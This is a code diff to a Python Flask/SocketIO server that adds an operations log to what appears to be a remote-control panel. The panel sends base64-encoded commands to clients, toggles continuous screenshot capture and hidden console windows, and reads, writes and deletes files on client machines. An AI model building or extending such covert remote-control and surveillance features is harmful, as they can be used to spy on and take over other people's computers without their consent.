@@ -5,6 +5,7 @@ import shutil
 import sqlite3
 import base64
 import threading
+from datetime import datetime, timezone
 from contextlib import contextmanager
 from functools import wraps
 
@@ -81,9 +82,64 @@ def init_db():
             )
             """
         )
+        conn.execute(
+            """
+            CREATE TABLE IF NOT EXISTS operations_log (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                username TEXT NOT NULL,
+                op_type TEXT NOT NULL,
+                details TEXT NOT NULL,
+                status TEXT DEFAULT 'success',
+                created_at TEXT DEFAULT (datetime('now'))
+            )
+            """
+        )
+        conn.execute(
+            "CREATE INDEX IF NOT EXISTS idx_ops_user ON operations_log(username, id DESC);"
+        )
 
 
 init_db()
+
+
+def log_operation(username: str, op_type: str, details: str, status: str = "success"):
+    """Record an operation in the database and broadcast to the dashboard in real-time."""
+    if not username or not is_safe_name(username):
+        return
+    try:
+        with get_db() as conn:
+            cursor = conn.cursor()
+            cursor.execute(
+                """
+                INSERT INTO operations_log (username, op_type, details, status, created_at)
+                VALUES (?, ?, ?, ?, datetime('now'))
+                """,
+                (username, op_type, details, status),
+            )
+            log_id = cursor.lastrowid
+            row = cursor.execute(
+                "SELECT created_at FROM operations_log WHERE id = ?", (log_id,)
+            ).fetchone()
+            created_at = (
+                row["created_at"]
+                if row
+                else datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
+            )
+
+        socketio.emit(
+            "new_operation_log",
+            {
+                "id": log_id,
+                "username": username,
+                "op_type": op_type,
+                "details": details,
+                "status": status,
+                "created_at": created_at,
+            },
+            room="dashboard",
+        )
+    except Exception as e:
+        print(f"[Log Error] {e}")
 
 
 # ── WebSockets Handlers ──
@@ -149,6 +205,7 @@ def handle_register(data):
         {"username": username, "online": True, "version": version},
         room="dashboard",
     )
+    log_operation(username, "SYSTEM", f"Client online (v{version or 'dev'})", "online")
 
 
 @socketio.on("disconnect")
@@ -159,6 +216,7 @@ def handle_disconnect():
         socketio.emit(
             "status_change", {"username": username, "online": False}, room="dashboard"
         )
+        log_operation(username, "SYSTEM", "Client disconnected", "offline")
 
 
 @socketio.on("heartbeat")
@@ -339,6 +397,7 @@ def delete_frames():
         try:
             shutil.rmtree(user_dir)
             os.makedirs(user_dir, exist_ok=True)
+            log_operation(username, "SCREENSHOT", "Wiped all stored screenshot frames")
         except Exception as e:
             return jsonify({"status": "error", "message": str(e)}), 500
 
@@ -370,6 +429,11 @@ def set_capture():
         )
 
     socketio.emit("set_capture", {"capture": bool(capture)}, room=username)
+    log_operation(
+        username,
+        "SCREENSHOT",
+        f"Continuous screenshot stream toggled {'ON' if capture else 'OFF'}",
+    )
     return jsonify({"status": "success"})
 
 
@@ -400,6 +464,11 @@ def set_visibility():
         return jsonify({"status": "error", "message": "Missing visible flag"}), 400
 
     _upsert_client_visibility(username, visible)
+    log_operation(
+        username,
+        "VISIBILITY",
+        f"Console window visibility set to {'Visible' if visible else 'Hidden'}",
+    )
     return jsonify({"status": "success"})
 
 
@@ -422,6 +491,35 @@ def set_command():
     # Instant WebSocket push command to client!
     socketio.emit("exec_command", {"cmd": cmd, "visible": visible}, room=username)
 
+    # Decode and categorize command for the operations log
+    try:
+        decoded = base64.b64decode(cmd).decode("utf-8", errors="replace").strip()
+    except Exception:
+        decoded = str(cmd).strip()
+
+    op_type = "COMMAND"
+    log_detail = decoded
+
+    if "SAPI.SpVoice" in decoded or decoded.startswith("speak:"):
+        op_type = "SPEAK"
+        if decoded.startswith("speak:"):
+            log_detail = decoded[6:].strip()
+    elif "WScript.Shell).Popup" in decoded or decoded.startswith("msg:"):
+        op_type = "MESSAGE"
+        if decoded.startswith("msg:"):
+            log_detail = decoded[4:].strip()
+    elif "installer.exe" in decoded:
+        op_type = "UPDATE"
+        log_detail = "Dispatched client update to latest release binary"
+    elif decoded.lower().startswith("vibrate"):
+        op_type = "DEVICE"
+        log_detail = f"Device vibration triggered ({decoded})"
+    elif decoded.lower().startswith("open:"):
+        op_type = "DEVICE"
+        log_detail = f"Opened URL: {decoded[5:].strip()}"
+
+    log_operation(username, op_type, log_detail, "dispatched")
+
     return jsonify({"status": "success", "message": "Command sent over WebSocket"})
 
 
@@ -441,6 +539,18 @@ def dispatch_fs_request(username, event_name, payload, timeout=10):
 
     req_payload = {"req_id": req_id, **payload}
     socketio.emit(event_name, req_payload, room=username)
+
+    action_map = {
+        "fs_list_req": "Listed directory contents",
+        "fs_read_req": "Read file content",
+        "fs_write_req": "Saved file content",
+        "fs_delete_req": "Deleted file/directory",
+        "fs_mkdir_req": "Created new directory",
+        "fs_rename_req": "Renamed file/directory",
+    }
+    action_desc = action_map.get(event_name, event_name)
+    target_path = payload.get("path") or payload.get("new_path") or "drives"
+    log_operation(username, "FTP", f"{action_desc}: {target_path}")
 
     if event.wait(timeout=timeout):
         res = pending_fs_requests.pop(req_id, {}).get("result")
@@ -548,6 +658,58 @@ def get_frame(username, filename):
     response = send_from_directory(user_dir, filename)
     response.headers["Cache-Control"] = "public, max-age=31536000, immutable"
     return response
+
+
+# ── Operations Log Routes ──
+
+
+@app.get("/api/logs/<username>")
+@require_password
+def get_user_logs(username):
+    if not is_safe_name(username):
+        return jsonify({"detail": "Invalid username"}), 400
+
+    limit = request.args.get("limit", 200, type=int)
+    limit = min(max(1, limit), 500)
+
+    with get_db() as conn:
+        rows = conn.execute(
+            """
+            SELECT id, username, op_type, details, status, created_at
+            FROM operations_log
+            WHERE username = ?
+            ORDER BY id DESC
+            LIMIT ?
+            """,
+            (username, limit),
+        ).fetchall()
+
+    return jsonify(
+        [
+            {
+                "id": r["id"],
+                "username": r["username"],
+                "op_type": r["op_type"],
+                "details": r["details"],
+                "status": r["status"],
+                "created_at": r["created_at"],
+            }
+            for r in rows
+        ]
+    )
+
+
+@app.post("/api/logs/<username>/clear")
+@require_password
+def clear_user_logs(username):
+    if not is_safe_name(username):
+        return jsonify({"detail": "Invalid username"}), 400
+
+    with get_db() as conn:
+        conn.execute("DELETE FROM operations_log WHERE username = ?", (username,))
+
+    log_operation(username, "SYSTEM", "Operation logs cleared by administrator")
+    return jsonify({"status": "success"})
 
 
 if __name__ == "__main__":
